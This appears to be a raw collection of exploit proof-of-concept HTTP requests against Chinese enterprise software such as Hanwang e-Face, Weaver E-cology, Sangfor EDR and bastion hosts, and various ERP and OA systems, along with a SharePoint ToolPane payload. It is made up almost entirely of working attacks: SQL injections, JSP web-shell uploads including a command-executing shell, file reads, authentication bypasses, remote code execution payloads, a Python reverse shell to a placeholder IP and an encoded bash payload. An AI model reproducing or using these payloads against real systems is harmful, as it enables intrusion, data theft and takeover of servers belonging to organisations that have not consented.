B24puPVtLiYrA%2F3kbNOFuT7%2B8gXq74nl34uH3peLY%2F0L%2Fr6t87vqJukkw7HbE%2FpV4s%2Fa%2F7NsXEejGunFptu2x9Yu8DTR9H1xExM8RBUpNYqnGGcJ1ki6BppxFUri7zOIrVrmj%2FoFMHAcdOBkfVzsQzs2RJ%2FT6OKc%2Bt7etb0PrNn1O02%2FreaXfFd%2BZ4%2Fik9EhfOQ2v4N%2Bb6od44YFHLlV%2Bq7f%2BT93hvxf8O2Y2bDoFJbA%2BOZX%2B2u3OvO2q%2FIXfywuT%2Fw8e%2F5LON%2BQ8y6iQbWOKp2FqHXRiwB3aMm7l9ayhZsbu7tqlwk1%2FIh6OurYCC1OBcL%2BGYnHs2zboJB5kaVZRaN9ZG1S4aW19WtcavW3TlZt3lfa9z71u%2F0bMls0r13Y%2FZtnDf%2BHdeWtKhOtIZTV3VL9%2FEbl0eO5DJHjYwTE76OahbVH3LSifJg7VboGZVYhIPZkMcnw3VkOll8H%2FNaqua2x5p0a8PIczt2ZTvEZ1yDDWnN4N%2BQ8bVn%2FdBLVqgtyu1DY6LTvCzOuP5tB3Gzdmio%2FapcBlSzmxbVq1Gvd9vN43MYrnlPx4Fow9pkKW26oF8mC3qz9gwuGn3SmaQxfKpmPvvsne1LWvru0V4BfIoovwSfs3H8ULPj%2FHIcQMfaQuH%2BTjzxPO%2Fzz2ZKY6dGQz1%2FUnHw%2B%2BTwLKlhc7AmP3ip65%2F5Zwx53hx6rnV37Xt69hKTjvaeHV9IC3SP8XWiwt51R8bBh%2B%2BN59EDI9Mk96%2FFwe7ev3BgraN%2F%2BHOySZc5dF%2F%2BdtjnjsrB9ObqvHy8%2Fexv0%2Fzgo%2FQr9aWGdvlg%2FNGj7sfffDh9e3X%2B8YXP%2BsbOd3%2FF4Or8O7%2BA8dWv9sw2xRe%2F1EPfaHnyqzxf%2FjbM1fkn39x5%2B%2Bf%2FAT299nCZKQAA%22+DataTable-CaseSensitive%3D%22false%22+runat%3D%22server%22%3E%0A%3C%2FScorecard%3AExcelDataSet%3E%0A++%3C%2Fdiv%3E%0A%3C%2FProgressTemplate%3E%0A%3C%2Fasp%3AUpdateProgress%3E%0A++++



POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1 
Host: x.x.x.x 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 
Content-Length: 7699 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Encoding: gzip, deflate, br 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Referer: /_layouts/SignOut.aspx 
Connection: close 
 MSOTlPn_Uri=http%3A%2F%2Fwww.itsc.org%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%0A++++%3C%25%40+Register+Tagprefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%0A++++%3C%25%40+Register+Tagprefix%3D%22asp%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web.Extensions%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D31bf3856ad364e35%22+%25%3E%0A%0A%3Casp%3AUpdateProgress+ID%3D%22UpdateProgress1%22+DisplayAfter%3D%2210%22+%0Arunat%3D%22server%22+AssociatedUpdatePanelID%3D%22upTest%22%3E%0A%3CProgressTemplate%3E%0A++%3Cdiv+class%3D%22divWaiting%22%3E++++++++++++%0A++++%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAEANVa23LbSJLt3stEzMzu0%2F6AQs%2B2BJCiu%2BWQHUGQLIi0CAkgUSAw4YjBzeIFANm8i3%2Bz37MftXsyCyRlW7Zlz07PrhymKBaqMvPkyVNZAH%2F6%2Baeffvpv%2FNBv%2Bvm3f8KL1XtYLNP8rBkuwxcnMp0vRtPizcWZRv9enDRW2XI1T98U6Wo5D7MXJ3erKBvF79KH%2FnSSFm%2BiX34Ja3HtlX5ZvUi1Xy%2F%2FlRb%2Fj0dr8ksvXZKtPw7yrBcP0zz8M941Rx8%2BmPMw%2F%2FlnGvvDP%2BPlP%2F90tV28XvAlJ9s8KxZvTk%2FVm9dbvB8ul7PX5%2BebzeZsUz2bzu%2FPK5qmnw%2B6N2rZ%2FbX5IoHVN6ereVGutniZj%2BL5dDH9sHwZT%2FPXuO6luur0ZJS8OV1M85T%2BWqTL07f%2F%2FqeTT37IrTRL87RYnhRhnn484USt9Lq9KIN9c7qcr9LD5%2B4ibazmc0y%2BmcZhlpbDT9jZ24KLsyzd9h9m6ReuOlw5nI7i9CQfFbdxvJoDJA12w%2B3%2Br1URTVdFkiZfMvflEIfp8ItO%2FpjDn85apL%2Bt0iJ%2B7pSn3ZxtigPShD%2F58Oa0pGBjmmVpvASnF2dmWqTzUXx2M1os%2F6r%2F5S%2BPWdpL52vguDhrF8t0XoTZWWs7Cwk3bx7OZun8r5XDBC%2BNztz2



NAME:\扁鹊医疗\扁鹊医疗GetLyfsByParams sql注入.txt
POC:
POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Content-Length: 198
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.0 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/534.0

strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x7b7e7b,(SELECT (ELT(9054=9054,1))),md5(123456),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=

NAME:\扁鹊医疗\扁鹊医疗GetMonitorList sql注入.txt
POC:
GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,current_user),1)+%26%26%27 HTTP/1.1

NAME:\时空智友\时空智友ERP系统 updater.uploadStudioFile 文件上传.txt
POC:
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>

NAME:\时空智友\时空智友企业流程化管控系统XML外部实体注入.txt
POC:
POST /formservice?service=attachment.write&isattach=false&filename=c.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 3

ccc

NAME:\明源\明源ERP ssologin.aspx身份认证绕过.txt
POC:
POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

__yzsAppSecret=test&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d




-------------------------------------------------------------------------------------------------------------------------------------------

GET /PubPlatform/nav/home/default?_nav=0000 HTTP/1.1
Cookie: userToken=674368A4EC31B7DF719C2CB32325206859FB63D329E30D59CC3A53EBDEF8A6D4AA0370A2A4143A3AB19A87D4BFA025252EAB17A695CE7006559242EBE643C0C7B4F430890D661F14A9B51EB9C3AE1384BF7CCD020C7AC0BD8C7EA2A82E76BFA790F391FC4CA2D628D4920D5F75E02DA2A2A19512449376AE159F8003001B2295;


NAME:\易宝\易宝OA-getPosition存在sql注入.txt
POC:
GET /SmartTradeScan/StockTake/getPosition?positionName=%27%20AND%202328%20IN%20(SELECT%20(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT%20(CASE%20WHEN%20(2328=2328)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(98)+CHAR(113)))%20AND%20%27EHJe%27=%27EHJe&stockRoomID=1&opeID=1&currentStatus=1&pickUpMode=11 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US;q=0.9,en;q=0.8
Accept: */*
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36



NAME:\汉王\汉王EFaceGo monadFileUpload.do 任意文件上传.txt
POC:
POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBundaryFfJZ4P1AZBixjELj

----WebKitFormBundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="ncbegw.jsp"
Content-Type: image/jpeg

<% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
----WebKitFormBundaryFfJZ4P1AZBixjELj

NAME:\汉王\汉王EFaceGo updateVisitorMapConfig.do任意文件上传.txt
POC:
POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: 

{"id":1,"mapName":"25bdaf","fileType":"jsp","updatedPhoto":"PCUgb3V0LnByaW50bG4oInBib31qb,5yZmlwbXBsc3VrZGVjenVkc2VmeG15d2UiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFN1cnZsZXBQYXRoKCkpKS5kZWxldGUoKTsgJT4"}

NAME:\汉王\汉王EFaceGo upload.do 任意文件上传.txt
POC:
POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabcxyzqw
Content-Length: 

------WebKitFormBoundaryabcxyzqw
Content-Disposition: form-data; name="file"; filename="testaa.jsp"
Content-Type: image/jpeg

<% out.println("asdfqwerzxcvbnmlkjhgtyuipoiuytre"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundaryabcxyzqw--

NAME:\汉王\汉王e脸通getGroupEmployee.do SQL注入.txt
POC:
GET /manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))  HTTP/1.1

NAME:\汉王\汉王e脸通综合管理平台 firstPeopleOpengetDoors.do 存在SQL注入.txt
POC:
GET /manage/intercom/..;/..;/manage/firstPeopleOpen/getDoors.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

NAME:\汉王\汉王e脸通综合管理平台 imgDownload.do 任意文件读取.txt
POC:
GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1

NAME:\汉王\汉王e脸通综合管理平台 queryAntisubmarineList.do 存在SQL注入.txt
POC:
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*



NAME:\汉王\汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入.txt
POC:
GET /manage/dgmCommand/finishRegister.do/..;/..;/doorInfo/queryDoorInfoList.du?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
Host:



NAME:\汉王\汉王e脸通综合管理平台 uploadBlackListFile.do 任意文件上传.txt
POC:
POST /manage/mobiVist/..%3B/systemBlackList/uploadBlackListFile.do HTTP/1.1
Host:

------WebKitFormBunddaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBunddaryFfJZ4P1AZBixjELj

NAME:\汉王\汉王e脸通综合管理平台exportResourceByFilePath.do任意文件读取.txt
POC:
GET /manage/leaveList/exportResourceByFilePath.do?filePath=WEB-INF/web.xml HTTP/1.1

NAME:\汉王\汉王getValidEmpForGroup.do SQL注入.txt
POC:
GET /manage/authMultiplePeople/getValidEmpForGroup.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1


NAME:\汉王\汉王queryAlarmEvent.do SQL注入.txt
POC:
GET /manage/alarm/queryAlarmEvent.do?order=/**/&columnKey=(UPDATEXML(2,CONCAT(0x2e,0x3131313131,(SELECT+(ELT(1=1,1))),0x3131313131),8))&recoToken=ZuZBOrvLG8M HTTP/1.1

NAME:\汉王\汉王queryManyPeopleGroupList.do SQL注入.txt
POC:
GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1

NAME:\泛微\泛微-eoffice block_content.php SQL注入.txt
POC:
GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20- HTTP/1.1


NAME:\泛微\泛微datasource update jdbc远程代码执行.txt
POC:


POST /api/integration/datasource/update/ HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 377
Content-Type: application/x-www-form-urlencoded
Cookie: __clusterSessionIDCookieName=adcf474c-8ca4-4002-b0d7-ce6e32486666;__clusterSessionCookieName=4D368CCF5613FEED9A080A2013810BDE;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246

pointid=aaa&type=sqlserver2025&iscluster=2&username=333&port=1&dbname=aaaa&password=11&usepool=1&minconn=5&maxconn=10&sortid=1&id=1&operate=test&host=abc&url=jdbc:h2:mem:test;MODE=MSSQLSERVER;INIT=CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.lang.Exception { return java.lang.Runtime.getRuntime().exec(cmd).getInputStream().toString(); } $$\;CALL EXEC('whoami');

NAME:\泛微\泛微E-cology9 前台SQL注入.txt
POC:
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=testConnection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 2236
Upgrade-Insecure-Requests: 1

formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0

NAME:\泛微\泛微ecology9FileDownloadLocation任意文件下载漏洞.txt
POC:
GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1

NAME:\泛微\泛微EcologyjQueryfiletree.jsp目录遍历漏洞.txt
POC:
GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1

NAME:\泛微\泛微remarkOperate远程命令执行.txt
POC:
POST /api/workflow/reqform/remarkOperate HTTP/1.1
Host:

{
  "operate": "save",
  "field5": "5241,5240",
  "IsBeForwardSubmitAlready": "1",
  "IsBeForwardAlready": "0",
  "IsSubmitedOpinion": "1",
  "IsBeForwardTodo": "0",
  "forwardflag": "1",
  "requestid": "5288726",
  "nodeid": "11995",
  "f_weaver_belongto_userid": "5240",
  "f_weaver_belongto_usertype": "0",
  "signworkflowids": "",
  "signdocids": "",
  "remarkLocation": "",
  "remark": "${T(java.lang.Runtime).getRuntime().exec('ping baidu.com')}",
  "remindTypes": "0,2"
}


NAME:\泛微\泛微OA前台登录绕过+后台组合拳RCE\泛微OA前台登录绕过权限绕过dwrcallplainc.txt
POC:
泛微	泛微OA前台登录绕过	权限绕过	未知	/dwr/call/plaincall/
/mobilemode/mobile/server.jsp
/weaver/ImgFileDownload/a.swf	
POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1
Host: xxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1




GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=BAAD7750912407C15FBC7CA2BDA4BDDDAEACE215E26BB871CE8D171028A66A70&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
Host: xxxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1




GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1
Host: xxxx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1	更新设备规则	0702	1day	AdySec																	

NAME:\泛微\泛微OA前台登录绕过+后台组合拳RCE\泛微后台rce20250701.txt
POC:
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="operation"

add
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptname"

ttttaaa
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptclass"

org.mvel2.sh.ShellSession
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptmethod"

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="decryptmethod"

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="isdialog"

0
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="x"; filename="x"

x
------WebKitFormBoundaryVnIIugCdViAmEyK3--




POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc




POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="operation"

test
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="plaintext"

马子
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="id"

2
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="x"; filename="x"

1
------WebKitFormBoundaryITdrxxca8L1Xo7Rq--

NAME:\浪潮云\浪潮GS PurBidSupplementSrv.asmx任意文件读取.txt
POC:
POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
Host:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: GSPWebLanguageKey=zh-CN
Upgrade-Insecure-Requests: 1

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body xmlns:m="http://tempuri.org/">
<m:downLoadFile>
<m:filePath>C:\Windows\win.ini</m:filePath>
<m:offset>0</m:offset>
</m:downLoadFile>
</soap:Body>
</soap:Envelope>

NAME:\深信服\深信服EDR rce CVE-2025-34041.txt
POC:
GET /tool/log/c.php?strip_slashes=system&limit=whoami HTTP/1.1

POST /tool/log/c.php HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 256

strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

NAME:\深信服\深信服OSM portal_login（堡垒机）rce.txt
POC:
POST /fort/portal_login HTTP/1.1
Host: 
Cookie: FORTSESSIONID=78DFD83A276124B65ECA5D316D66D47F
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
Content-Type: application/json
Content-Length: 94

"{\"userName\":\"Bob\", \"loginUrl\":\"`id`\", \"role\": \"\", \"password\": \"123456789\"}" #

NAME:\深信服\深信服运维安全管理系统set_port存在RCE.txt
POC:
POST /fort/system;login/netConfig/set_port HTTP/1.1
Host: 

select=6379+-j+DROP%0A%62%61%73%68%20%2d%63%20%24%28%65%63%68%6f%20%5a%57%4e%6f%62%79%41%69%55%45%4e%57%64%6d%52%59%55%58%56%6b%4d%30%70%77%5a%45%64%56%62%30%6c%71%52%57%6c%4c%56%48%4e%73%55%47%63%39%50%53%49%67%66%47%4a%68%63%32%55%32%4e%43%41%74%5a%43%41%2b%49%43%39%31%63%33%49%76%62%47%39%6a%59%57%77%76%64%47%39%74%59%32%46%30%4c%33%64%6c%59%6d%46%77%63%48%4d%76%5a%6d%39%79%64%43%39%30%63%6e%56%7a%64%43%39%32%5a%58%4a%7a%61%57%39%75%4c%32%78%76%5a%79%35%71%63%33%41%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%20%2d%69%29%0a%65%78%69%74%3b%0Aecho&Unselect=22,443,9443

NAME:\灵当\灵当 CRM getLogInfo.php文件上传漏洞.txt
POC:
<=V8.6.3.3.11

POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename=221.php......&callednumber=&sessionvalue=ca6ee37ed4ea2c709b2d36d1349cacff HTTP/1.1
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploaded_file"; filename="123321.avi"
Content-Type: image/jpeg

<?php
print "Hello, World!";
?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--

NAME:\理政\理正企业综合管理系统LzMIS任意SQL语句执行.txt
POC:
POST /ajax/LeadingMIS.CustomExp.AjaxExp,LeadingMIS.CustomExp.ashx?_method=ExecSQLScalarToString&_session=no HTTP/1.1
Host: 
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1013.22 Safari/537.36

strSQL=select @@version

NAME:\用友\用友 NC IMetaWebService4BqCloud 数据源 SQL 注入.txt
POC:
